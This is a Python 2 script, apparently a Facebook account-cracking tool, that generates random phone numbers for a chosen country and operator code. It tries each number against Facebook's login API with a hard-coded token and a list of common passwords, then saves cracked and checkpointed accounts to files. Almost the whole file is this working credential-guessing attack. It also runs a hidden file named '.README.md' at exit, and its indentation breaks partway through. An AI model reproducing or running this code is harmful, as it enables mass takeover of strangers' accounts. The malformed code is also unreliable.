import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(20000):

    nmbr = random.randint(1111111, 9999999)

    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
        print '[!] Exit'
        os.sys.exit()

def psb(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)

def t():
    time.sleep(1)
def cb():
    os.system('clear')
##### LOGO #####
logo='''
\033[1;91m█▀▄▀█ █▀▀█ █▀▀ ░▀░ █▀▀█
\033[1;93m█░▀░█ █▄▄█ █▀▀ ▀█▀ █▄▄█
\033[1;92m▀░░░▀ ▀░░▀ ▀░░ ▀▀▀ ▀░░▀

\033[1;97m█░█ ░▀░ █░░ █░░ █▀▀ █▀▀█
\033[1;96m█▀▄ ▀█▀ █░░ █░░ █▀▀ █▄▄▀
\033[1;95m▀░▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░▀▀



\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;91mNAME : \033[0;92mXP-FAROOQ ANSARI                     \033[0;91m      ║
\033[0;91m║\033[0;91mWHATSAPP NO :\033[0;92m +92132197796                     \033[0;91m     ║
\033[0;91m║\033[0;91mNOTE :\033[0;92m PLZ DON,T CALL ME ONLY TEXT   \033[0;91m   ║
\033[0;95m╰════════════════════════════════════════════╯
                                '''

back = 0
successful = []
cpb = []
oks = []
id = []


def menu():
        os.system('clear')
        print logo
        print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n"
        print '\033[1;94m[1]\033[1;96m  Bangladesh'
        print '\033[1;94m[2]\033[1;93m  USA'
        print '\033[1;94m[3]\033[1;96m  UK'
        print '\033[1;94m[4] \033[1;93m India'
        print '\033[1;94m[5]\033[1;96m  Brazil'
        print '\033[1;94m[6]\033[1;93m  Japan'
        print '\033[1;94m[7]\033[1;96m  Korea'
        print '\033[1;94m[8]\033[1;93m  Italy'
        print '\033[1;94m[9]\033[1;96m  Spain'
        print '\033[1;94m[10]\033[1;93m Poland'
        print '\033[1;94m[11]\033[1;96m Pakistan'
        print '\033[1;94m[12]\033[1;93m Indonisia'
        print '\033[1;94m[13]\033[1;91m Update XP-TRICKER'
        print '[0]\033[1;97m  Exit            '
        print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n"
        action()




def action():
        bch = raw_input('\n\033[1;91m>>>  ')
        if bch =='':
                print '[!] Fill in correctly'
                action()
        elif bch =="1":
                os.system("clear")
                print (logo)
                print("\033[1;93m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199")
                try:
                        c = raw_input("\033[1;96m choose code  : ")
                        k="+880"
                        idlist = ('.txt')
                        for line in open(idlist,"r").readlines():
                                id.append(line.strip())
                except IOError:
                        print ("[!] File Not Found")
                        raw_input("\n[ Back ]")
                        menu()
        elif bch =="2":
                os.system("clear")
                print (logo)
                print("786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
                try:
                        c = raw_input(" choose code  : ")
                        k="+1"
                        idlist = ('.txt')
                        for line in open(idlist,"r").readlines():
                                id.append(line.strip())
                except IOError:
                        print ("[!] File Not Found")
                        raw_input("\n[ Back ]")
                        menu()
        elif bch =="3":
                os.system("clear")
                print (logo)
                print("737, 706, 748, 783, 739, 759, 790")
                try:
                        c = raw_input(" choose code  : ")
                        k="+44"
                        idlist = ('.txt')
                        for line in open(idlist,"r").readlines():
                                id.append(line.strip())
                except IOError:
                        print ("[!] File Not Found")
                        raw_input("\n[ Back ]")
                        menu()
        elif bch =="4":
                os.system("clear")
                print (logo)
                print("954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
                try:
                        c = raw_input(" choose code  : ")
                        k="+91"
                        idlist = ('.txt')
                        for line in open(idlist,"r").readlines():
                                id.append(line.strip())
                except IOError:
                        print ("[!] File Not Found")
                        raw_input("\n[ Back ]")
                        menu()
        elif bch =="5":
                os.system("clear")
                print (logo)
                print("127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
                try:
                        c = raw_input(" choose code  : ")
                        k="+55"
                        idlist = ('.txt')
                        for line in open(idlist,"r").readlines():
                                id.append(line.strip())
                except IOError:
                        print ("[!] File Not Found")
                        raw_input("\n[ Back ]")
                        menu()
        elif bch =="6":
                os.system("clear")
                print (logo)
                print("11, 12, 19, 16, 15, 13, 14, 18, 17")
                try:
                        c = raw_input(" choose code  : ")
                        k="+81"
                        idlist = ('.txt')
                        for line in open(idlist,"r").readlines():
                                id.append(line.strip())
                except IOError:
                        print ("[!] File Not Found")
                        raw_input("\n[ Back ]")
                        menu()
        elif bch =="7":
                os.system("clear")
                print (logo)
                print("1, 2, 3, 4, 5, 6, 7, 8, 9")
                try:
                        c = raw_input(" choose code  : ")
                        k="+82"
                        idlist = ('.txt')
                        for line in open(idlist,"r").readlines():
                                id.append(line.strip())
                except IOError:
                        print ("[!] File Not Found")
                        raw_input("\n[ Back ]")
                        menu()
        elif bch =="8":
                os.system("clear")
                print (logo)
                print("388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
                try:
                        c = raw_input(" choose code  : ")
                        k="+39"
                        idlist = ('.txt')
                        for line in open(idlist,"r").readlines():
                                id.append(line.strip())
                except IOError:
                        print ("[!] File Not Found")
                        raw_input("\n[ Back ]")
                        menu()
        elif bch =="9":
                os.system("clear")
                print (logo)
                print("60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
                try:
                        c = raw_input(" choose code  : ")
                        k="+34"
                        idlist = ('.txt')
                        for line in open(idlist,"r").readlines():
                                id.append(line.strip())
                except IOError:
                        print ("[!] File Not Found")
                        raw_input("\n[ Back ]")
                        menu()
        elif bch =="10":
                os.system("clear")
                print (logo)
                print("66, 69, 78, 79, 60, 72, 67, 53, 51")
                try:
                        c = raw_input(" choose code  : ")
                        k="+48"
                        idlist = ('.txt')
                        for line in open(idlist,"r").readlines():
                                id.append(line.strip())
                except IOError:
                        print ("[!] File Not Found")
                        raw_input("\n[ Back ]")
                        menu()
        elif bch =="11":
                os.system("clear")
                print (logo)
                print("\033[1;93m01, ~to~~, 49")
                try:
                        c = raw_input(" choose code  : ")
                        k="+1"
                        idlist = ('.txt')
                        for line in open(idlist,"r").readlines():
                                id.append(line.strip())
                except IOError:
                        print ("[!] File Not Found")
                        raw_input("\n[ Back ]")
                        menu()
        elif bch =="12":
                os.system("clear")
                print (logo)
                print("\033[1;93m81,83,85,84,89,")
                try:
                        c = raw_input(" choose code  : ")
                        k="+1"
                        idlist = ('.txt')
                        for line in open(idlist,"r").readlines():
                                id.append(line.strip())
                except IOError:
                        print ("[!] File Not Found")
                        raw_input("\n[ Back ]")
                        menu()
        elif bch =="13":
                os.system('xdg-open https://m.youtube.com/channel/UCFrYWrvT_TobefkZDD3sa_w')
                login()
        elif bch =='0':
                exb()
        else:
                print '[!] Fill in correctly'
                action()

        xxx = str(len(id))
        psb ('[✓] Total Numbers: '+xxx)
        time.sleep(0.5)
        psb ('\033[1;91m[✓]\033[1;94m Please wait, process is running ...')
        time.sleep(0.5)
        psb ('[!] To Stop Process Press CTRL Then Press z')
        time.sleep(0.5)
        print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n"



        def main(arg):
                global cpb,oks
                user = arg
                try:
                        os.mkdir('save')
                except OSError:
                        pass
                try:
                        pass1 = user
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1  
                                okb = open('save/successfull.txt', 'a')
                                okb.write(k+c+user+pass1+'\n')
                                okb.close()
                                oks.append(c+user+pass1)
                        else:
                                if 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
                                        cps = open('save/checkpoint.txt', 'a')
                                        cps.write(k+c+user+pass1+'\n')
                                        cps.close()
                                        cpb.append(c+user+pass1)
                                else:
                                        pass2 = k + c + user
                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
                                                okb = open('save/successfull.txt', 'a')
                                                okb.write(k+c+user+pass2+'\n')
                                                okb.close()
                                                oks.append(c+user+pass2)
                                        else:
                                           if 'www.facebook.com' in q['error_msg']:
                                               print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
                                               cps = open('save/checkpoint.txt', 'a')
                                               cps.write(k+c+user+pass2+'\n')
                                               cps.close()
                                               cpb.append(c+user+pass2)
                                           else:
                                               pass3="pakistan123"
                                               data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                               q = json.load(data)
                                               if 'access_token' in q:
                                                   print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
                                                   okb = open('save/successfull.txt', 'a')
                                                   okb.write(k+c+user+pass3+'\n')
                                                   okb.close()
                                                   oks.append(c+user+pass3)
                                               else:
                                                   if 'www.facebook.com' in q['error_msg']:
                                                       print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
                                                       cps = open('save/checkpoint.txt', 'a')
                                                       cps.write(k+c+user+pass3+'\n')
                                                       cps.close()
                                                       cpb.append(c+user+pass3)
                                                   else:
                                                       pass4="bangladesh123"
                                                       data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
                                        okb = open('save/successfull.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
                                            cps = open('save/checkpoint.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5=""
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
                                                okb = open('save/successfull.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
                                                    cps = open('save/checkpoint.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                else:                                                                                                                                                             
                                                    pass6="786786"
                                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
                                                        okb = open('save/successfull.txt', 'a')
                                                        okb.write(k+c+user+pass6+'\n')
                                                        okb.close()
                                                        oks.append(c+user+pass6)                                                                                                                                  
                                                    else:                                                                                   
                                                        if 'www.facebook.com' in q['error_msg']:
                                                            print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
                                                            cps = open('save/checkpoint.txt', 'a')
                                                            cps.write(k+c+user+pass6+'\n')
                                                            cps.close()
                                                            cpb.append(c+user+pass6)                                                                                                                              
                                                        else:                                                                                                                                                     
                                                            pass7="786786786"
                                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
                                                                okb = open('save/successfull.txt', 'a')
                                                                okb.write(k+c+user+pass7+'\n')
                                                                okb.close()
                                                                oks.append(c+user+pass7)                                                                                                                          
                                                            else:                                                                                                                                                 
                                                                if 'www.facebook.com' in q['error_msg']:
                                                                    print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
                                                                    cps = open('save/checkpoint.txt', 'a')
                                                                    cps.write(k+c+user+pass7+'\n')
                                                                    cps.close()
                                                                    cpb.append(c+user+pass7)                                                                                                                      
                                                                else:                                                                                                                                             
                                                                    pass8="000786"
                                                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                    q = json.load(data)
                                                                    if 'access_token' in q:
                                                                        print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass8
                                                                        okb = open('save/successfull.txt', 'a')
                                                                        okb.write(k+c+user+pass8+'\n')
                                                                        okb.close()
                                                                        oks.append(c+user+pass8)                                                                                                                  
                                                                    else:                                                                                                                                         
                                                                        if 'www.facebook.com' in q['error_msg']:
                                                                            print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass8
                                                                            cps = open('save/checkpoint.txt', 'a')
                                                                            cps.write(k+c+user+pass8+'\n')
                                                                            cps.close()
                                                                            cpb.append(c+user+pass8)                                                                                                              
                                                                        else:                                                                                                                                     
                                                                            pass9="123456"
                                                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                            q = json.load(data)
                                                                            if 'access_token' in q:
                                                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass9
                                                                                okb = open('save/successfull.txt', 'a')
                                                                                okb.write(k+c+user+pass9+'\n')
                                                                                okb.close()
                                                                                oks.append(c+user+pass9)                                                                                                          
                                                                            else:                                                                                                                                 
                                                                                if 'www.facebook.com' in q['error_msg']:
                                                                                    print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass9
                                                                                    cps = open('save/checkpoint.txt', 'a')
                                                                                    cps.write(k+c+user+pass9+'\n')
                                                                                    cps.close()
                                                                                    cpb.append(c+user+pass9)                                                                                                      
                                                                                else:                                                                                                                             
                                                                                    pass10="1234567890"
                                                                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                    q = json.load(data)
                                                                                    if 'access_token' in q:
                                                                                        print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass10
                                                                                        okb = open('save/successfull.txt', 'a')
                                                                                        okb.write(k+c+user+pass10+'\n')
                                                                                        okb.close()
                                                                                        oks.append(c+user+pass10)                                                                                                 
                                                                                    else:                                                                                                                         
                                                                                        if 'www.facebook.com' in q['error_msg']:
                                                                                            print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass10
                                                                                            cps = open('save/checkpoint.txt', 'a')
                                                                                            cps.write(k+c+user+pass10+'\n')
                                                                                            cps.close()
                                                                                            cpb.append(c+user+pass10)                                                                                             


                except:
                        pass

        p = ThreadPool(30)
        p.map(main, id)
        print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰"
        print '[✓] Process Has Been Completed ....'
        print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
        print('[✓] CP File Has Been Saved : save/checkpoint.txt')
        raw_input('\n[Press Enter To Go Back]')
        os.system('python2 .README.md')

if __name__ == '__main__':
        menu()
